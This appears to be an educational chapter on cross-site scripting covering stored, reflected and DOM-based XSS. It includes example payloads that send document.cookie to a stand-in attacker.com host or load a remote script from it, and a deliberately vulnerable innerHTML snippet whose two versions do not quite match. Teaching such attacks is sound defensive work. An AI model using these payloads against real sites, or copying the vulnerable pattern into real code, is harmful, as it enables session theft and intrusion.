# Cross-Site Scripting \(XSS\)

Web applications usually respond to HTTP requests from a user's browser or other application. The server application will send a mixture of HTML, CSS and JavaScript that will be rendered and executed by the client. The browser will take the HTML and create a document object model \(DOM\) of the page using the CSS to style and format the HTML. Finally, JavaScript may be executed, and this could dynamically change the DOM and styling. Using JavaScript in this way helps to make the page responsive and avoiding round trips on the network back to the server. All of this makes the code that executes on the client vulnerable to attack in a number of different points in this process.

Cross-site scripting is another example of allowing unchecked and unsanitized input. In this case, the input is of HTML and JavaScript. If the JavaScript is executed by a target's browser, there is the potential to do a number of malicious things including:

* JavaScript to steal cookies that may contain session tokens that can be used for impersonation of a user.
* Use HTML5 to gain access to microphones, cameras and other devices on the computer
* Keylogging by registering event listeners
* Make other HTTP requests to carry out Server-Side Request Forgery \(SSRF\) attacks
* Change the appearance of the page to abuse the target

XSS relies on the targeted user to interact with URLs and to potentially allow access when requested, so it relies heavily on social engineering techniques to trick a user into doing things on the attacker's behalf. In this respect though, it is not that dissimilar to phishing attacks generally.

There are three main types of XSS. The first two differ in whether they are persistent or not.

### Stored XSS

Stored XSS is where an attacker injects malicious content that is stored by the application and then served up to other victims who visit the site. An example of this is would be injecting script into the input of a comment feature on a site which then gets displayed to other users. The script can be crafted to steal cookies by using the code:

```javascript
<script>window.location="http://attacker.com/?cookie=" + document.cookie</script>
```

Javascript can be incorporated into other HTML elements such as

```javascript
<img src="javascript:alert('XSS');">
```

More sophisticated scripts can be included from external sources:

```javascript
<script src=http://attacker.com/xss.js></script>
```

### Reflected XSS

This is a non-persistent XSS attack where the target is tricked into clicking a link to a site that incorporates the malicious script. An example of this would be tricking a target to click on a search link:

```markup
<a href=http://search.com/search?keyword=<script>window.location='http://attacker.com/?cookie=' + document.cookie</script>;>Click Here</a>

```

The script would be executed when the search function prints the results:

```text
You searched for: <script>window.location='http://attacker.com/?cookie=' + document.cookie</script>
Results: …
```

Again the user needs to be tricked into clicking a link and ideally not noticing the results of that click.

### DOM-based XSS

In DOM-based XSS, the attacker uses the existing scripts on a page to write malicious code to the page itself where it is then executed. All of this can happen on the client when the page's javaScript is executed bypassing any filtering or protection on the server itself.

Taking the requested URL from the previous example

`http://search.com/search?keyword=javascript:alert("DOM XSS on: " + document.domain)`

The following HTML would be vulnerable:

```markup
<html>
Your search: <em></em>
<script>
  var keyword = location.search.substring(9);
  document.querySelector('em').innerHTML = keyword;
  window.location=document.querySelector('em').innerHTML
</script>
</html>
```

This would then result in the malicious script being included in the page:

```markup
<html>
Your search: <em>javascript:alert("DOM XSS on: " + document.domain)</em>
<script>
  var keyword = location.search.substring(6);
  document.querySelector('em').innerHTML = keyword;
</script>
</html>
```

This would result in an alert being popped up.

